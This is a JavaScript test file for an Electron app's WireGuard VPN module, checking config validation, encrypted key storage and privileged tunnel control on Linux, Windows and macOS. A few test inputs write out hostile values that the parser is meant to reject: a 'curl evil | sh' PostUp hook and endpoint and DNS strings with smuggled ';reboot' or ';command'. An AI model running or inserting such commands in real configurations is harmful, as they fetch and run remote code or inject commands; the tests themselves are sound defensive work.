const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const path = require('node:path');
const os = require('node:os');
const { DeviceVpn, parseConfig, renderConfig, appleScriptCommand } = require('../electron/device-vpn');

const key = Buffer.alloc(32, 1).toString('base64');
const peerKey = Buffer.alloc(32, 2).toString('base64');
const sample = `[Interface]\nPrivateKey = ${key}\nAddress = 10.66.0.2/32, fd42:42::2/128\nDNS = 1.1.1.1\n\n[Peer]\nPublicKey = ${peerKey}\nEndpoint = vpn.example.com:51820\nAllowedIPs = 0.0.0.0/0, ::/0\n`;
const storage = {
  isEncryptionAvailable:()=>true, getSelectedStorageBackend:()=> 'gnome_libsecret',
  encryptString:s=>Buffer.from(s).map(c=>c ^ 0xa5), decryptString:b=>Buffer.from(b).map(c=>c ^ 0xa5).toString(),
};
const findTool = async candidates => candidates[0];
async function tempRoot() { return fs.mkdtemp(path.join(os.tmpdir(), 'openpath-device-')); }

test('WireGuard profiles require full IPv4/IPv6 routes and reject privileged hooks', () => {
  const parsed = parseConfig(sample);
  assert.equal(parsed.endpoint, 'vpn.example.com:51820');
  assert.match(renderConfig(parsed, {dnsMode:'ads'}), /DNS = 94\.140\.14\.14, 94\.140\.15\.15/);
  assert.match(renderConfig(parsed, {dnsMode:'malware'}), /DNS = 9\.9\.9\.9, 149\.112\.112\.112/);
  assert.match(renderConfig(parsed, {dnsMode:'custom', customDns:'10.66.0.1, 1.1.1.1'}), /DNS = 10\.66\.0\.1, 1\.1\.1\.1/);
  assert.throws(()=>renderConfig(parsed, {dnsMode:'custom', customDns:'bad;command'}), /Custom DNS/);
  assert.throws(()=>parseConfig(sample.replace('AllowedIPs = 0.0.0.0/0, ::/0','AllowedIPs = 0.0.0.0/0')), /both 0\.0\.0\.0\/0 and ::\/0/);
  assert.throws(()=>parseConfig(sample.replace('[Peer]', 'PostUp = curl evil | sh\n[Peer]')), /unsafe WireGuard directive/);
  assert.throws(()=>parseConfig(sample.replace('[Peer]', 'Table = off\n[Peer]')), /unsafe WireGuard directive/);
  assert.throws(()=>parseConfig(sample.replace('vpn.example.com:51820','vpn.example.com:51820;reboot')), /Endpoint/);
  assert.throws(()=>parseConfig(sample.replace(key, 'not-a-key')), /PrivateKey/);
  assert.throws(()=>parseConfig(sample+'\n[Peer]\nPublicKey = '+peerKey), /one Interface followed by one Peer/);
});

test('Linux imports an encrypted profile, invokes WireGuard safely and cleans temporary secrets', async () => {
  const root = await tempRoot();
  let active = false; const calls = []; let startedConfig = '';
  const run = async (file, args)=>{
    calls.push([file, args]);
    if(file.endsWith('/ip')) {
      if(active) return 'opvpn0';
      throw Object.assign(new Error('missing'), {stderr:'Device "opvpn0" does not exist.'});
    }
    if(file.endsWith('/pkexec') || file.endsWith('/wg-quick')) {
      const action = file.endsWith('/pkexec') ? args[1] : args[0];
      const filename = file.endsWith('/pkexec') ? args[2] : args[1];
      assert.equal(path.basename(filename), 'opvpn0.conf');
      const config = await fs.readFile(filename, 'utf8');
      if(action === 'up') { active = true; startedConfig = config; }
      else { assert.match(config, /DNS = 94\.140\.14\.14/); active = false; }
      return '';
    }
    throw new Error(`Unexpected command ${file}`);
  };
  try {
    const importedFile = path.join(root, 'input.conf'); await fs.writeFile(importedFile, sample);
    const vpn = new DeviceVpn({storagePath:root, safeStorage:storage, platform:'linux', findTool, run});
    const imported = await vpn.importFile(importedFile);
    assert.deepEqual(imported, {configured:true, endpoint:'vpn.example.com:51820', hasIPv6Address:true});
    assert.equal((await fs.readFile(path.join(root,'device-vpn','profile.enc'))).includes(Buffer.from(key)), false);
    const started = await vpn.connect({dnsMode:'ads'});
    assert.equal(started.state, 'active'); assert.equal(started.owned, true);
    assert.match(startedConfig, /DNS = 94\.140\.14\.14/);
    assert.equal((await fs.readdir(path.join(root,'device-vpn'))).some(name=>name.startsWith('wg-')), false);
    await assert.rejects(vpn.importFile(importedFile), /Disconnect/);
    const stopped = await vpn.disconnect();
    assert.equal(stopped.state, 'inactive'); assert.equal(stopped.owned, false);
    await vpn.removeProfile(); assert.equal((await vpn.status()).configured, false);
    assert.ok(calls.some(([file])=>file.endsWith('/pkexec') || file.endsWith('/wg-quick')));
  } finally { await fs.rm(root, {recursive:true, force:true}); }
});

test('Windows protects the service config and removes it after stopping the service', async () => {
  const root = await tempRoot(); let active = false; let protectedDir = false; let serviceConfig = '';
  const run = async (file, args, opts={})=>{
    if(file.toLowerCase().endsWith('powershell.exe')) {
      const script = args.at(-1);
      if(script.includes('DirectorySecurity')) {
        protectedDir = true;
        assert.match(script, /SetAccessRuleProtection\(\$true,\$false\)/);
        assert.match(script, /S-1-5-18/);
        assert.equal(opts.env.OPVPN_DIRECTORY, path.join(root,'device-vpn'));
        return '';
      }
      if(script.includes('Get-Service')) return active ? 'Running' : 'absent';
      if(script.includes('Start-Process')) {
        assert.match(script, /\$ErrorActionPreference='Stop'/);
        assert.equal(protectedDir, true);
        if(opts.env.OPVPN_ACTION === '/installtunnelservice') {
          serviceConfig = opts.env.OPVPN_ARGUMENT;
          assert.match(await fs.readFile(serviceConfig, 'utf8'), /DNS = 9\.9\.9\.9/);
          active = true;
        } else { assert.equal(opts.env.OPVPN_ARGUMENT, 'opvpn0'); active = false; }
        return '';
      }
    }
    throw new Error(`Unexpected command ${file}`);
  };
  try {
    const input = path.join(root,'source.conf'); await fs.writeFile(input,sample);
    const vpn = new DeviceVpn({storagePath:root, safeStorage:storage, platform:'win32', findTool, run});
    await vpn.importFile(input); assert.equal((await vpn.connect({dnsMode:'malware'})).state, 'active');
    assert.ok(await fs.stat(serviceConfig)); // Windows service rereads this after a restart.
    vpn.readVault = async()=>{ throw new Error('keychain unavailable'); };
    assert.equal((await vpn.disconnect()).state, 'inactive');
    await assert.rejects(fs.stat(serviceConfig), {code:'ENOENT'});
  } finally { await fs.rm(root, {recursive:true, force:true}); }
});

test('macOS elevated command quotes paths and interface ownership is respected', async () => {
  const quoted = appleScriptCommand('/opt/homebrew/bin/wg-quick', 'up', "/Users/O'Brien/opvpn0.conf");
  assert.match(quoted, /^do shell script /);
  assert.match(quoted, /administrator privileges$/);
  assert.ok(quoted.includes("O'"));
  const root = await tempRoot(); const wgDir = path.join(root,'run'); await fs.mkdir(wgDir);
  let active = false;
  const run = async (file, args)=>{
    if(file === '/sbin/ifconfig') { if(active) return ''; throw new Error('missing'); }
    if(file === '/usr/bin/osascript') {
      assert.ok(args[1].includes('with administrator privileges'));
      if(args[1].includes("'up'")) { active = true; await fs.writeFile(path.join(wgDir,'opvpn0.name'),'utun123'); }
      else { active = false; await fs.rm(path.join(wgDir,'opvpn0.name')); }
      return '';
    }
    throw new Error(`Unexpected ${file}`);
  };
  try {
    const input = path.join(root,'source.conf'); await fs.writeFile(input,sample);
    const vpn = new DeviceVpn({storagePath:root, safeStorage:storage, platform:'darwin', findTool, run, wireguardDir:wgDir});
    await vpn.importFile(input);
    assert.equal((await vpn.connect({dnsMode:'unfiltered'})).state,'active');
    assert.equal((await vpn.disconnect()).state,'inactive');
    active = true; await fs.writeFile(path.join(wgDir,'opvpn0.name'),'utun123');
    await assert.rejects(vpn.disconnect(), /not started by OpenPath/);
  } finally { await fs.rm(root, {recursive:true, force:true}); }
});

test('a missing or insecure keychain is not used to save private keys', async () => {
  const root = await tempRoot();
  const run = async ()=>{ throw Object.assign(new Error('missing'),{stderr:'Device does not exist'}); };
  try {
    const input = path.join(root,'source.conf'); await fs.writeFile(input,sample);
    const badStorage = {...storage, getSelectedStorageBackend:()=> 'basic_text'};
    const vpn = new DeviceVpn({storagePath:root, safeStorage:badStorage, platform:'linux', findTool, run});
    await assert.rejects(vpn.importFile(input), /system keychain/);
    assert.equal(await vpn.imported(), false);
  } finally { await fs.rm(root, {recursive:true, force:true}); }
});

test('a successful command without an active interface is not reported as connected', async () => {
  const root = await tempRoot();
  const run = async (file)=>{
    if(file.endsWith('/ip')) throw Object.assign(new Error('missing'),{stderr:'Device "opvpn0" does not exist.'});
    return '';
  };
  try {
    const input=path.join(root,'source.conf'); await fs.writeFile(input,sample);
    const vpn=new DeviceVpn({storagePath:root,safeStorage:storage,platform:'linux',findTool,run});
    await vpn.importFile(input);
    await assert.rejects(vpn.connect(), /did not report an active interface/);
    assert.equal((await vpn.status()).owned,false);
  } finally { await fs.rm(root,{recursive:true,force:true}); }
});

test('a failed start never takes ownership of an interface created by another client', async () => {
  const root=await tempRoot(); let active=false;
  const run=async(file)=>{
    if(file.endsWith('/ip')) {
      if(active) return 'opvpn0';
      throw Object.assign(new Error('missing'),{stderr:'Device "opvpn0" does not exist.'});
    }
    active=true; throw new Error('Interface already exists');
  };
  try {
    const input=path.join(root,'source.conf'); await fs.writeFile(input,sample);
    const vpn=new DeviceVpn({storagePath:root,safeStorage:storage,platform:'linux',findTool,run});
    await vpn.importFile(input);
    await assert.rejects(vpn.connect(), /already exists/);
    assert.equal((await vpn.status()).owned,false);
    await assert.rejects(vpn.disconnect(), /not started by OpenPath/);
  } finally { await fs.rm(root,{recursive:true,force:true}); }
});

test('Windows retains ownership and config if service removal is not confirmed', async () => {
  const root=await tempRoot(); let state='absent'; let configPath='';
  const run=async(file,args,opts={})=>{
    const script=args.at(-1);
    if(script.includes('DirectorySecurity')) return '';
    if(script.includes('Get-Service')) return state;
    if(script.includes('Start-Process')) {
      if(opts.env.OPVPN_ACTION==='/installtunnelservice') {configPath=opts.env.OPVPN_ARGUMENT;state='Running';}
      else state='Stopped';
      return '';
    }
    throw new Error('Unexpected call');
  };
  try {
    const input=path.join(root,'source.conf'); await fs.writeFile(input,sample);
    const vpn=new DeviceVpn({storagePath:root,safeStorage:storage,platform:'win32',findTool,run});
    await vpn.importFile(input); await vpn.connect();
    await assert.rejects(vpn.disconnect(), /did not confirm/);
    assert.equal((await vpn.status()).owned,true);
    assert.ok(await fs.stat(configPath));
  } finally { await fs.rm(root,{recursive:true,force:true}); }
});

test('Windows creates a protected directory and inherited service-file ACL', {skip:process.platform !== 'win32'}, async () => {
  const {execFile} = require('node:child_process');
  const {promisify} = require('node:util');
  const root = await tempRoot();
  try {
    const vpn = new DeviceVpn({storagePath:root, safeStorage:storage});
    await vpn.initDir();
    const file=path.join(vpn.dir,'acl-check.conf');
    await fs.writeFile(file,'test');
    const powershell=await vpn.windowsTool('powershell');
    const script = [
      "$ErrorActionPreference='Stop'",
      '$dir=[System.IO.Directory]::GetAccessControl($env:OPVPN_TEST_DIR)',
      '$file=[System.IO.File]::GetAccessControl($env:OPVPN_TEST_FILE)',
      '$user=[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value',
      '$type=[System.Security.Principal.SecurityIdentifier]',
      '$d=@($dir.GetAccessRules($true,$true,$type) | ForEach-Object {$_.IdentityReference.Value})',
      '$f=@($file.GetAccessRules($true,$true,$type) | ForEach-Object {$_.IdentityReference.Value})',
      '@{user=$user; protected=$dir.AreAccessRulesProtected; directory=$d; file=$f} | ConvertTo-Json -Compress',
    ].join('; ');
    const {stdout}=await promisify(execFile)(powershell,['-NoProfile','-NonInteractive','-Command',script],{
      env:{...process.env,OPVPN_TEST_DIR:vpn.dir,OPVPN_TEST_FILE:file},windowsHide:true,
    });
    const acl=JSON.parse(stdout);
    assert.equal(acl.protected,true);
    assert.deepEqual(acl.directory.sort(),[acl.user,'S-1-5-18'].sort());
    assert.deepEqual(acl.file.sort(),[acl.user,'S-1-5-18'].sort());
  } finally { await fs.rm(root,{recursive:true,force:true}); }
});

test('macOS accepts the elevated command as valid AppleScript', {skip:process.platform !== 'darwin'}, async () => {
  const {execFile} = require('node:child_process');
  const {promisify} = require('node:util');
  const root = await tempRoot();
  try {
    const script=appleScriptCommand('/opt/homebrew/bin/wg-quick','up',"/Users/O'Brien/Library/Application Support/opvpn0.conf");
    await promisify(execFile)('/usr/bin/osacompile',['-e',script,'-o',path.join(root,'check.scpt')]);
  } finally { await fs.rm(root,{recursive:true,force:true}); }
});
